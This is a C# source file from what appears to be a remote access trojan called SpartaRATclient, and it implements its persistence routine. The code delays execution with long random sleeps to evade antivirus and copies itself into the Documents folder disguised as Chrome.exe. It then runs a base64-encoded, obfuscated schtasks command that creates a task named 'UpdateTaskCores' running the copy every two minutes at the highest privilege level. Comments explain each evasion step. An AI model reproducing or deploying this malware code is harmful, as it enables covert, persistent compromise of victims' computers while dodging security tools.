using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Tools;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public static void Create()
        {
            Random rnd = new Random();
            //Long sleeps will make it harder for the anti virus to say anything
            Thread.Sleep(rnd.Next(200_000, 400_000));

            if (!RegistryCheck.CheckIfExist("HaveTaskSchedulerItem"))
            {
                FileCopy.This();
                //Create a task scheduler tsak using powershell encodings to make it harder for the anti virus to detect us. I used the OG tool "Invoke-Obfuscation" by danielbohannon.
                //original command: schtasks /create /sc minute /mo 2 /tn UpdateTaskCores /tr "C:\Users\env:username\Documents\Chrome.exe" /rl HIGHEST
                //I encoded the obfuscated powershell code with base64: ".(\"{2}{1}{0}\"-f 'ks','chtas','s') /create /sc minute /mo 2 /tn UpdateTaskCores /tr (((\"{1}{8}{6}{3}{5}{7}{4}{0}{2}\" -f '0}Chr','C:{0}Us',(\"{0}{1}\" -f (\"{1}{0}\" -f '.','ome'),'exe'),(\"{1}{0}\" -f(\"{1}{0}\"-f 'ame','rn'),'use'),'ents{','%','rs{0}%','{0}Docum','e'))-f[cHAR]92) /rl HIGHEST"
                //The base64: Ii4oXCJ7Mn17MX17MH1cIi1mICdrcycsJ2NodGFzJywncycpIC9jcmVhdGUgL3NjIG1pbnV0ZSAvbW8gMiAvdG4gVXBkYXRlVGFza0NvcmVzIC90ciAoKChcInsxfXs4fXs2fXszfXs1fXs3fXs0fXswfXsyfVwiIC1mICcwfUNocicsJ0M6ezB9VXMnLChcInswfXsxfVwiIC1mIChcInsxfXswfVwiIC1mICcuJywnb21lJyksJ2V4ZScpLChcInsxfXswfVwiIC1mKFwiezF9ezB9XCItZiAnYW1lJywncm4nKSwndXNlJyksJ2VudHN7JywnJScsJ3JzezB9JScsJ3swfURvY3VtJywnZScpKS1mW2NIQVJdOTIpIC9ybCBISUdIRVNUIg==
                Shell.Run(Encoding.UTF8.GetString(Convert.FromBase64String("Ii4oXCJ7Mn17MX17MH1cIi1mICdrcycsJ2NodGFzJywncycpIC9jcmVhdGUgL3NjIG1pbnV0ZSAvbW8gMiAvdG4gVXBkYXRlVGFza0NvcmVzIC90ciAoKChcInsxfXs4fXs2fXszfXs1fXs3fXs0fXswfXsyfVwiIC1mICcwfUNocicsJ0M6ezB9VXMnLChcInswfXsxfVwiIC1mIChcInsxfXswfVwiIC1mICcuJywnb21lJyksJ2V4ZScpLChcInsxfXswfVwiIC1mKFwiezF9ezB9XCItZiAnYW1lJywncm4nKSwndXNlJyksJ2VudHN7JywnJScsJ3JzezB9JScsJ3swfURvY3VtJywnZScpKS1mW2NIQVJdOTIpIC9ybCBISUdIRVNUIg==")), 16);
                RegistryCreate.Create("HaveTaskSchedulerItem", "");
            }
        }
    }
}
